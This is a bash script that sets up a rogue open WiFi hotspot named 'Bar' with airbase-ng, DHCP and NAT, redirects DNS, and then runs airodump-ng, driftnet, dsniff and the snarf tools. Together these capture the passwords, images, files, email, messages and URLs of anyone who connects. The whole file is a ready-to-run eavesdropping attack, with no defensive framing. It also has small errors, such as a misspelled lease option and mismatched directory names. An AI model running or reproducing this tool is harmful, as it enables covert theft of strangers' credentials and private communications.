#!/bin/bash

clear

cd $HOME
mkdir -p CAPS
cd CAPS
rm -f dhcpd.conf
touch dhcpd.conf
echo "
subnet 192.168.2.128 netmask 255.255.255.128 {
    range 192.168.2.130 192.168.2.140;
    option domain-name-servers 8.8.8.8;
    option routers 192.168.2.129;
    option broadcast-address 192.168.2.255;
    default-least-time 600;
    max-lease-time 7200;
    ddns-update-style ad-hoc;
    }
" >> dhcpd.conf

echo "[*] Activating Mon0"
airmon-ng start wlan0 1> /dev/null 2> /dev/null

echo "[*] Creating BAR WiFi"
airbase-ng -e "Bar" -c 9 mon0 & 1> /dev/null 2> /dev/null

echo "[*] Ifconfig at0 Up"
ifconfig at0 up 1> /dev/null 2> /dev/null
echo "[*] Configurating At0"
ifconfig at0 192.168.2.129 netmask 255.255.255.128 1> /dev/null 2> /dev/null
echo "[*] Route add"
route add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129 1> /dev/null 2> /dev/null

echo "[*] Launching Dhcp3"
mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd
dhcpd3 -cf $HOME/CAPS/dhcpd.conf -pf /var/run/dhcpd/dhcpd.pid at0

echo "[*] Setting Iptables Rules"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 192.168.0.1

mkdir -p Bar
cd Bar
mkdir -p driftnet
echo "[*] Airodump-ng"
( roxterm -e airodump-ng mon0 -o cap -w $HOME/Caps/Bar/rete.cap ) &
echo "[*] Driftnet"
( roxterm -e driftnet -i mon0 -a -d $HOME/Caps/Bar/driftnet -m 10000 ) &
echo "[*] Dsniff"
( roxterm -e dsniff -p $HOME/Caps/Bar/rete.cap -w $HOME/Caps/Bar/dsniff.txt ) &
echo "[*] Filesnarf"
( roxterm -e filesnarf -p  $HOME/Caps/Bar/rete.cap ) &
echo "[*] Mailsnarf"
( roxterm -e mailsnarf -p  $HOME/Caps/Bar/rete.cap ) & 
echo "[*] Msgsnarf"
( roxterm -e msgsnarf -p  $HOME/Caps/Bar/rete.cap ) & 
echo "[*] Urlsnarf"
( roxterm -e urlsnarf -p  $HOME/Caps/Bar/rete.cap ) & 
